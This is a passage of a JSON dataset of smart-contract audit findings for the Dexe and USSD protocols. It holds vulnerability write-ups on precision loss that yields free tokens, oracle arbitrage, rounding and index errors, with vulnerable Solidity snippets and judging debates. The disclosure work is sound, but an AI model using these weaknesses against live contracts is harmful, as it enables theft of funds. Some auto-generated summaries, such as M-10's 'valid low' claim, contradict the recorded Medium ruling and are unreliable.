`TokenSaleProposalWhitelist` [L50](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol#L50)\n* `ERC721Power` [L113](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L113), [L139](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L139)\n* `TokenBalance` [L35](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L35), [L62](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L62)\n\n**Dexe:**\nFixed in commit [c700d9f](https://github.com/dexe-network/DeXe-Protocol/commit/c700d9f9f328d1df853891b52fd3527b56a6f1df).\n\n**Cyfrin:** Verified. While other places have been changed, `TokenBalance::sendFunds()` still uses `from18()` instead of `from18Safe()` & other parts of the codebase which allow user input when calling `TokenBalance::sendFunds()` directly could be impacted by a similar issue.\n\nFor example `TokenSaleProposalWhitelist::unlockParticipationTokens()` - if users try to unlock a small enough amount of locked tokens which are in 6 decimal precision, state will be updated as if the unlock was successful but the resulting conversion in `TokenBalance::sendFunds()` will round down to 0. Execution will continue & zero tokens will be transferred to the user but since storage has been updated those tokens will remain forever locked.\n\nDexe should carefully consider if there exists any valid situations where the `from18()` conversion in `TokenBalance::sendFunds()` should round an input > 0 to 0, and the transaction should not revert but continue executing transferring 0 tokens? Cyfrin recommends that the \"default\" conversion to use is `from18Safe()` and that `from18()` should only be used where conversions to 0 are explicitly allowed.",
      "summary": "\nA bug report has been submitted for the `TokenSaleProposalBuy::buy` function in the Dexe Network Protocol. This function is called by users looking to buy the DAO token using a pre-approved token. The exchange rate for this sale is pre-assigned for the specific tier. This function internally calls `TokenSaleProposalBuy::_purchaseWithCommission` to transfer funds from the buyer to the gov pool. Part of the transferred funds are used to pay the DexeDAO commission and balance funds are transferred to the `GovPool` address. To do this, `TokenSaleProposalBuy::_sendFunds` is called.\n\nThis function assumes that the `amount` of ERC20 token is always 18 decimals. The `DecimalsConverter::from18` function converts from a base decimal (18) to token decimals. Note that the amount is directly passed by the buyer and there is no prior normalisation done to ensure the token decimals are converted to 18 decimals before the `_sendFunds` is called. This can lead to a total loss to the DAO when tokens with smaller decimals, such as USDC with 6 decimals, are used.\n\nThe impact of this bug is that a buyer can claim DAO tokens for free. A proof of concept has been included in the report.\n\nTwo options have been recommended for mitigation. Option 1 is to revise the design decision that all token amounts must be sent in 18 decimals even if the underlying token decimals are not 18, to instead that all token amounts should be sent in their native decimals and Dexe will convert everything. Option 2 is to keep the current design but revert if `amount.from18(token.decimals()) == 0` or alternatively use the `from18Safe()` function which uses `_convertSafe()` that reverts if the conversion is 0.\n\nThe project team should also examine other areas where the same pattern occurs which may have the same vulnerability and where it may be required to revert if the conversion returns 0.\n\nThe bug has been fixed in commit [c700d9f](https://github.com/dexe-network/DeXe-Protocol/commit/c700d9f9f328d1df853891b",
      "quality_score": 1.007154661394276,
      "rarity_score": 3.0007154661394275,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Precision Loss",
        "Decimals",
        "Weird ERC20",
        "ERC20"
      ],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "19151",
      "title": "M-11: Lack of Redeem Feature",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/958 \n\n## Found by \n0xMosh, 0xRobocop, BugBusters, WATCHPUG, ast3ros, ctf\\_sec, juancito, sashik\\_eth, shealtielanz, shogoki, the\\_endless\\_sea, ustas\n## Summary\n\n## Vulnerability Detail\n\nThe whitepaper mentions a redeeming feature that allows the user to redeem USSD for DAI (see section 4 \"Mint and redeem\"), but it is currently missing from the implementation.\n\nAlthough there is a \"redeem\" boolean in the collateral settings, there is no corresponding feature that enables the redemption of USSD to any of the underlying collateral assets.\n\n## Impact\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/interfaces/IUSSDRebalancer.sol#L13-L21\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevise the whitepaper and docs to reflect the fact that there is no redeem function or add a redeem function.\n\n\n\n## Discussion\n\n**securitygrid**\n\nEscalate for 10 USDC\nThis is valid low/info.\nSo far, lacking redeem is no impact.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> This is valid low/info.\n> So far, lacking redeem is no impact.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0xJuancito**\n\nEscalate for 10 USDC\n\nThis is a valid High. \n\n--- \n\nEscalating the comment:\n\n> This is valid low/info.\n> So far, lacking redeem is no impact.\n\n--- \n\nThe impact is explained on the whitepaper and quoted on the \"Vulnerability Detail\" section from issue https://github.com/sherlock-audit/2023-05-USSD-judging/issues/218:\n\nAs per the [USSD whitepaper](https://github.com/USSDofficial/ussd-whitepaper/blob/main/whitepaper.pdf):\n\n> If there is positive DAI balance in the collateral, USSD contract can provide\nDAI for equal amount of USSD in return (that would be burned, contracting\nsupply).\n\nThe importance of this is said here:\n\n> Ability to mint and redeem USSD for DAI could serve as incentives to rebalance the coin when this is economically viable\n\nAnd the most important feature is to have a mechanism to \"help USSD recover in negative scenarios\":\n\n> These methods also could be used to help USSD recover in negative scenarios:\nif USSD value falls below 1 DAI and there are less than 1 DAI reserves per USSD\nto refill the reserves allowing the USSD to recover it’s price by reducing supply\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is a valid High. \n> \n> --- \n> \n> Escalating the comment:\n> \n> > This is valid low/info.\n> > So far, lacking redeem is no impact.\n> \n> --- \n> \n> The impact is explained on the whitepaper and quoted on the \"Vulnerability Detail\" section from issue https://github.com/sherlock-audit/2023-05-USSD-judging/issues/218:\n> \n> As per the [USSD whitepaper](https://github.com/USSDofficial/ussd-whitepaper/blob/main/whitepaper.pdf):\n> \n> > If there is positive DAI balance in the collateral, USSD contract can provide\n> DAI for equal amount of USSD in return (that would be burned, contracting\n> supply).\n> \n> The importance of this is said here:\n> \n> > Ability to mint and redeem USSD for DAI could serve as incentives to rebalance the coin when this is economically viable\n> \n> And the most important feature is to have a mechanism to \"help USSD recover in negative scenarios\":\n> \n> > These methods also could be used to help USSD recover in negative scenarios:\n> if USSD value falls below 1 DAI and there are less than 1 DAI reserves per USSD\n> to refill the reserves allowing the USSD to recover it’s price by reducing supply\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**abhishekvispute**\n\nwell this is what protocol team said that time regarding redeem \nthat it is intentional \n\n![image](https://github.com/sherlock-audit/2023-05-USSD-judging/assets/46760063/a3c4378e-eab2-4a1a-946a-f5107f756dbc)\n\n\n**ctf-sec**\n\n> well this is what protocol team said that time regarding redeem that it is intentional\n> \n> ![image](https://user-images.githubusercontent.com/46760063/248562171-a3c4378e-eab2-4a1a-946a-f5107f756dbc.png)\n\nvalid low based on the sponsor's feedback\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nThis issue can be considered a valid medium based on the Whitepaper description of the importance of having a the redeem function.\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xJuancito](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/958/#issuecomment-1604979329): accepted\n- [securitygrid](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/958/#issuecomment-1604576035): rejected",
      "summary": "\nThis bug report is about the lack of a redeem feature in the USSD implementation. The redeem feature was mentioned in the whitepaper, but not implemented in the actual system. This feature is important, as it provides incentives to rebalance the coin when it is economically viable, and helps USSD recover in negative scenarios. \n\nThe bug was found by 0xMosh, 0xRobocop, BugBusters, WATCHPUG, ast3ros, ctf_sec, juancito, sashik_eth, shealtielanz, shogoki, the_endless_sea, and ustas. Manual review was used as the tool.\n\nThe impact of the lack of redeem feature was discussed by securitygrid, 0xJuancito, abhishekvispute, ctf_sec, and hrishibhat. Securitygrid suggested that it was valid low/info and that the lack of redeem feature had no impact, while 0xJuancito suggested that it was a valid High. Abhishekvispute mentioned that the protocol team had said that the lack of redeem was intentional. Ctf_sec suggested that it was valid low based on the sponsor's feedback, and hrishibhat suggested that it was a valid medium based on the Whitepaper description of the importance of having a the redeem function. \n\nThe issue was finally resolved by sherlock-admin, who accepted 0xJuancito's escalation for 10 USDC and rejected securitygrid's.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/958",
      "tags": [],
      "finders": [
        "shealtielanz",
        "ustas",
        "juancito",
        "the\\_endless\\_sea",
        "WATCHPUG",
        "shogoki",
        "0xRobocop",
        "BugBusters",
        "0xMosh",
        "sashik\\_eth",
        "ast3ros",
        "ctf\\_sec"
      ]
    },
    {
      "id": "19150",
      "title": "M-10: If collateral factor is high enough, flutter ends up being out of bounds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/889 \n\n## Found by \nJ4de, neumo\n## Summary\nIn `USSDRebalancer` contract, function `SellUSSDBuyCollateral` will revert everytime a rebalance calls it, provided the collateral factor is greater than all the elements of the `flutterRatios` array.\n\n## Vulnerability Detail\nFunction `SellUSSDBuyCollateral` calculates `flutter` as the lowest index of the `flutterRatios` array for which the collateral factor is smaller than the flutter ratio.\n```solidity\nuint256 cf = IUSSD(USSD).collateralFactor();\nuint256 flutter = 0;\nfor (flutter = 0; flutter < flutterRatios.length; flutter++) {\n\tif (cf < flutterRatios[flutter]) {\n\t  break;\n\t}\n}\n```\nThe problem arises when, if collateral factor is greater than all flutter values, after the loop `flutter = flutterRatios.length`.\n\nThis `flutter` value is used afterwards here:\n```solidity\n...\nif (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n  portions++;\n}\n...\n```\n And here:\n ```solidity\n...\nif (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n  if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n\t// don't touch DAI if it's needed to be bought (it's already bought)\n\tIUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n  }\n}\n...\n```\n\nAs we can see in the tests of the project, the flutterRatios array and the collateral ratios array are set to be of the same length, so if flutter = flutterRatios.length, any call to that index in the `ratios` array will revert with an index out of bounds.\n\n## Impact\nHigh, when the collateral factor reaches certain level, a rebalance that calls `SellUSSDBuyCollateral` will always revert.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L178-L184\n\n## Tool used\nManual review.\n\n\n## Recommendation\nWhen checking `collateral[i].ratios[flutter]` always check first that flutter is `< flutterRatios.length`.\n\n\n\n\n\n## Discussion\n\n**neumoxx**\n\nEscalate for 10 USDC\nThe issue is marked as duplicate of #940, and in that issue there's a comment from the judge that states `This is an admin input, requires admin error to cause problems`. The issue does not depend on an admin input to arise. The flutter ratios are set in the tests according to values mentioned in the whitepaper: https://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/test/USSDsimulator.test.js#L391-L393. \nThe collateral factor:\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/USSD.sol#L179-L191\ncan grow beyond the last value of the flutter ratios array and that would make the `SellUSSDBuyCollateral` function to revert.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> The issue is marked as duplicate of #940, and in that issue there's a comment from the judge that states `This is an admin input, requires admin error to cause problems`. The issue does not depend on an admin input to arise. The flutter ratios are set in the tests according to values mentioned in the whitepaper: https://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/test/USSDsimulator.test.js#L391-L393. \n> The collateral factor:\n> https://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/USSD.sol#L179-L191\n> can grow beyond the last value of the flutter ratios array and that would make the `SellUSSDBuyCollateral` function to revert.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\n[here](https://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/USSDRebalancer.sol#L62)\n\n```solidity\n    function setFlutterRatios(uint256[] calldata _flutterRatios) public onlyControl {\n      flutterRatios = _flutterRatios;\n    }\n```\n\nflutterRatios can be adjusted by admin\n\nValid low\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nThis is a valid issue where the rebalance reverts in certain conditions due to the unexpected final loop flutter values. \n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [neumoxx](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/889/#issuecomment-1605375095): accepted",
      "summary": "\nThis bug report is about an issue with the `USSDRebalancer` contract, in which a rebalance call reverts if the collateral factor is greater than all the elements of the `flutterRatios` array. This is because the `flutter` value, which is calculated as the lowest index of the `flutterRatios` array for which the collateral factor is smaller than the flutter ratio, is set to equal the length of the `flutterRatios` array if the collateral factor is greater than all the elements. This `flutter` value is then used in two places, where it can cause an index out of bounds error if it is greater than the length of `flutterRatios` array.\n\nThe impact of this issue is high, as it can make a rebalance call always revert. The code snippet for this issue can be found at https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L178-L184. The issue was found through manual review.\n\nThe recommendation for this issue is to check that the `flutter` value is always less than the length of the `flutterRatios` array when checking `collateral[i].ratios[flutter]`. The issue was escalated for 10 USDC, and it was found to be a valid low issue. It was also found that the flutterRatios array can be adjusted by the admin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/889",
      "tags": [],
      "finders": [
        "neumo",
        "J4de"
      ]
    },
    {
      "id": "19149",
      "title": "M-9: Using the collateral assets' oracle price at 100% of its value to mint USSD without a fee can be used for arbitrage.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/836 \n\n## Found by \nWATCHPUG\n## Summary\n\nAllowing the users to mint USSD using the collateral assets, at 100% of its value based on the oracle price without a fee can easily be exploited by the arbitragers.\n\n## Vulnerability Detail\n\nThe Oracle price can not be trusted as the real-time price.\n\nFor example, the BTC/USD and ETH/USD price feeds on miannet have a \"Deviation threshold\" of 0.5%, meaning that the price will only be updated once the price movement exceeds 0.5% within the heartbeat period.\n\nSay if the previous price point for WETH is 1000 USD, the price will only be updated once the price goes up to more than 1005 USD or down to less than 995 USD.\n\n## Impact\n\nWhen the market price of WETH is lower than the oracle price, it is possible to mint 1000 USSD by using 1 WETH and selling it to DAI, causing the quality of the collateral for USSD to continuously decrease and the value to be leaked to the arbitragers.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L150-L173\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding a minting fee of 0.5% to 1% (should be higher than the deviation).\n\n\n\n## Discussion\n\n**0xRobocop**\n\nEscalate for 10 USDC\n\nThis is not an issue, it assumes that a \"real-time\" price exists which is theoretically impossible. In reality there is no way to value a collateral precisely to a \"real-time\" price because this \"price\" does not exists and the markets are aligned thanks to arbitrageurs. \n\nWe cannot say that the chainlink price (if chainlink is behaving properly and contract consumes the prices safely) is below or above the \"market-price\", because there is no such \"market-price\", what we can say is that some market has a different price than chainlink's oracle. For example the ETH / DAI uniswap pool may have the price of 1 ETH for 996 DAI and chainlink's price may be 1 ETH for 1000 DAI. Watson argues that this scenario will:\n\n`cause the quality of the collateral for USSD to continuously decrease and the value to be leaked to the arbitragers.`\n\nWhich is not true, what will happen is the next:\n\n- 1. User will send 1 ETH to the USSD protocol and receive 1000 USSD.\n- 2. User will change 1000 USSD for 1000 DAI.\n- 3. User will buy ETH in uniswap with the 1000 DAI and receive 1.004 ETH, driving up the price of ETH in uniswap.\n- 4. User will repeat the process until the uniswap price is equal to the chainlink price and the arbitrage is no longer possible.\n- 5. ETH price increased in the \"below-price\" market, making the ETH collateral of the USSD protocol more valuable across different markets.\n\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is not an issue, it assumes that a \"real-time\" price exists which is theoretically impossible. In reality there is no way to value a collateral precisely to a \"real-time\" price because this \"price\" does not exists and the markets are aligned thanks to arbitrageurs. \n> \n> We cannot say that the chainlink price (if chainlink is behaving properly and contract consumes the prices safely) is below or above the \"market-price\", because there is no such \"market-price\", what we can say is that some market has a different price than chainlink's oracle. For example the ETH / DAI uniswap pool may have the price of 1 ETH for 996 DAI and chainlink's price may be 1 ETH for 1000 DAI. Watson argues that this scenario will:\n> \n> `cause the quality of the collateral for USSD to continuously decrease and the value to be leaked to the arbitragers.`\n> \n> Which is not true, what will happen is the next:\n> \n> - 1. User will send 1 ETH to the USSD protocol and receive 1000 USSD.\n> - 2. User will change 1000 USSD for 1000 DAI.\n> - 3. User will buy ETH in uniswap with the 1000 DAI and receive 1.004 ETH, driving up the price of ETH in uniswap.\n> - 4. User will repeat the process until the uniswap price is equal to the chainlink price and the arbitrage is no longer possible.\n> - 5. ETH price increased in the \"below-price\" market, making the ETH collateral of the USSD protocol more valuable across different markets.\n> \n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**twicek**\n\nEscalate for 10 USDC\n\nI agree with the comments made by 0xRobocop, this report describe a common scenario that lead to an arbitrage opportunity, which is not an issue.\nHitting the deviation threshold will lead for the price to be updated earlier than usual which will naturally lead to the arbitrage opportunity described by 0xRobocop. Adding a minting fee could actually be more detrimental since it would prevent arbitrager from getting the USSD / DAI Pool to equilibrium.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> I agree with the comments made by 0xRobocop, this report describe a common scenario that lead to an arbitrage opportunity, which is not an issue.\n> Hitting the deviation threshold will lead for the price to be updated earlier than usual which will naturally lead to the arbitrage opportunity described by 0xRobocop. Adding a minting fee could actually be more detrimental since it would prevent arbitrager from getting the USSD / DAI Pool to equilibrium.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nAgree with the escalation.\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this a valid medium. \nLead Watson comment:\n>  comment is basically describing the arbitrage CAN happen, the missing part there is ETH/DAI is a much deeper pool than USSD/DAI, the USSD/DAI pool will suffer a much bigger damage before the arbitrage opportunity disappears. This is not a common/natural scenario\n\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xRobocop](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/836/#issuecomment-1605228222): rejected\n- [twicek](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/836/#issuecomment-1605860157): rejected",
      "summary": "\nBug report M-9 was found by WATCHPUG and is related to allowing users to mint USSD using the collateral assets, at 100% of its value based on the oracle price without a fee. This can be exploited by the arbitragers as the Oracle price can not be trusted as the real-time price. If the market price of the collateral is lower than the oracle price, it is possible to mint USSD by using the collateral and selling it to DAI, causing the quality of the collateral for USSD to continuously decrease and the value to be leaked to the arbitragers. The code snippet for this issue can be found at https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L150-L173.\n\nThe possible solutions for this issue suggested are to consider adding a minting fee of 0.5% to 1% (should be higher than the deviation). However, it was argued that this scenario will not cause the quality of the collateral for USSD to continuously decrease and the value to be leaked to the arbitragers, but instead the ETH price will increase in the \"below-price\" market, making the ETH collateral of the USSD protocol more valuable across different markets.\n\nThe escalations for this issue were rejected and the status of the bug report was set to Medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/836",
      "tags": [],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "19148",
      "title": "M-8: `BuyUSSDSellCollateral()` always sells 0 amount if need to sell part of collateral",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/656 \n\n## Found by \nJ4de, T1MOH\n## Summary\nDue to rounding error there is misbehaviour in `BuyUSSDSellCollateral()` function. It results in selling 0 amount of collateral.\n\n## Vulnerability Detail\nSuppose the only collateral in protocol is 1 WBTC; 1 WBTC costs 30_000 USD;\nUniV3Pool DAI/ USSD has following liquidity: (3000e6 USSD, 2000e18 DAI)\nAnd also USSD is underpriced so call rebalance:\n```solidity\n    function rebalance() override public {\n      uint256 ownval = getOwnValuation(); // it low enough to dive into if statement (see line below) \n      (uint256 USSDamount, uint256 DAIamount) = getSupplyProportion(); // (3000e6 USSD, 2000e18 DAI)\n      if (ownval < 1e6 - threshold) {\n        // peg-down recovery\n        BuyUSSDSellCollateral((USSDamount - DAIamount / 1e12)/2); //  500 * 1e6     = (3000e6 - 2000e18 / 1e12) / 2\n```\nTake a look into BuyUSSDSellCollateral (follow comments):\n```solidity\n    function BuyUSSDSellCollateral(uint256 amountToBuy) internal { // 500e6\n      CollateralInfo[] memory collateral = IUSSD(USSD).collateralList();\n      //uint amountToBuyLeftUSD = amountToBuy * 1e12 * 1e6 / getOwnValuation();\n      uint amountToBuyLeftUSD = amountToBuy * 1e12; // 500e18\n      uint DAItosell = 0;\n      // Sell collateral in order of collateral array\n      for (uint256 i = 0; i < collateral.length; i++) {\n        // 30_000e18 = 1e8 * 1e18 / 10**8 * 30_000e18 / 1e18\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval > amountToBuyLeftUSD) {\n          // sell a portion of collateral and exit\n          if (collateral[i].pathsell.length > 0) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD); // 0\n            // amountToSellUnits = 1e8 * ((500e18 * 1e18 / 30_000e18) / 1e18) / 1e18 = 1e8 * (0) / 1e18 = 0\n            uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n            // and finally executes trade of 0 WBTC\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore); // 0 = 0 - 0\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore); // 0 += 0\n            ...\n```\nSo protocol will not buy DAI and will not sell DAI for USSD in UniswapV3Pool to support peg of USSD to DAI\n\n## Impact\nProtocol is not able of partial selling of collateral for token. It block algorithmic pegging of USSD to DAI \n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L121\n\n## Tool used\n\nManual Review, VS Code\n\n## Recommendation\nRefactor formula of amountToSellUnits\n```solidity\n// uint256 amountToSellUnits = (decimals of collateral) * (DAI amount to get for sell) / (price of 1 token of collateral)\nuint256 amountToSellUnits = collateral[i].token).decimals() * amountToBuyLeftUSD / collateral[i].oracle.getPriceUSD()\n```\n\n\n\n\n## Discussion\n\n**T1MOH593**\n\nEscalate for 10 USDC\n\nThis is not a duplicate of #111\nThis report describes that partially collateral can't be sold, because `amountToSellUnits` is 0 due to rounding issue. Noticed #183 is similar to my issue\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is not a duplicate of #111\n> This report describes that partially collateral can't be sold, because `amountToSellUnits` is 0 due to rounding issue. Noticed #183 is similar to my issue\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI agree this issue and #183 are not duplicate of #111 and can be grouped together as a new valid medium, will see if this is a duplicate of other issue\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\n\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [T1MOH593](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/656/#issuecomment-1604582674): accepted",
      "summary": "\nThis bug report is about an issue with the `BuyUSSDSellCollateral()` function in the `USSDRebalancer.sol` code. This function is responsible for buying USSD and selling collateral in order to maintain the peg of USSD to DAI. The problem is that due to a rounding error, the function always sells 0 amount of collateral. As a result, the protocol is not able to partially sell collateral for the token, which blocks the algorithmic pegging of USSD to DAI.\n\nThe issue was found by J4de and T1MOH, who used manual review and VS Code to identify the bug. The recommendation is to refactor the formula of `amountToSellUnits` to fix the issue. The code snippet provided in the report can be used to make the necessary changes. \n\nThe impact of this bug is that the protocol is not able to partially sell collateral for the token, which blocks the algorithmic pegging of USSD to DAI. The severity of the bug has been determined to be medium, with duplicates. The bug report has been successfully resolved, with T1MOH593's escalation accepted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/656",
      "tags": [],
      "finders": [
        "J4de",
        "T1MOH"
      ]
    },
    {
      "id": "19147",
      "title": "M-7: Risk of Incorrect Asset Pricing by StableOracle in Case of Underlying Aggregator Reaching minAnswer",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/598 \n\n## Found by \nBauchibred, BugBusters, Madalad, RaymondFam, T1MOH, TheNaubit, berlin-101, chalex.eth, kiki\\_dev\n## Summary\nChainlink aggregators have a built-in circuit breaker to prevent the price of an asset from deviating outside a predefined price range. This circuit breaker may cause the oracle to persistently return the minPrice instead of the actual asset price in the event of a significant price drop, as witnessed during the LUNA crash. \n\n## Vulnerability Detail\nStableOracleDAI.sol, StableOracleWBTC.sol, and StableOracleWETH.sol utilize the ChainlinkFeedRegistry to fetch the price of the requested tokens.\n\n```solidity\nfunction latestRoundData(\n  address base,\n  address quote\n)\n  external\n  view\n  override\n  checkPairAccess()\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  )\n{\n  uint16 currentPhaseId = s_currentPhaseId[base][quote];\n  AggregatorV2V3Interface aggregator = _getFeed(base, quote);\n  require(address(aggregator) != address(0), \"Feed not found\");\n  (\n    roundId,\n    answer,\n    startedAt,\n    updatedAt,\n    answeredInRound\n  ) = aggregator.latestRoundData();\n  return _addPhaseIds(roundId, answer, startedAt, updatedAt, answeredInRound, currentPhaseId);\n}\n```\nChainlinkFeedRegistry#latestRoundData extracts the linked aggregator and requests round data from it. If an asset's price falls below the minPrice, the protocol continues to value the token at the minPrice rather than its real value. This discrepancy could have the protocol end up [minting](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L151-L173) drastically larger amount of stableCoinAmount as well as returning a much bigger [collateral factor](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L179-L194).\n\nFor instance, if TokenA's minPrice is $1 and its price falls to $0.10, the aggregator continues to report $1, rendering the related function calls to entail a value that is ten times the actual value.\n\nIt's important to note that while Chainlink oracles form part of the OracleAggregator system and the use of a combination of oracles could potentially prevent such a situation, there's still a risk. Secondary oracles, such as Band, could potentially be exploited by a malicious user who can DDOS relayers to prevent price updates. Once the price becomes stale, the Chainlink oracle's price would be the sole reference, posing a significant risk.\n\n## Impact\nIn the event of an asset crash (like LUNA), the protocol can be manipulated to handle calls at an inflated price.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L33-L53\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWBTC.sol#L21-L26\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleWETH.sol#L21-L26\n\n## Tool used\n\nManual Review\n\n## Recommendation\nStableOracle should cross-check the returned answer against the minPrice/maxPrice and revert if the answer is outside of these bounds:\n\n```solidity\n    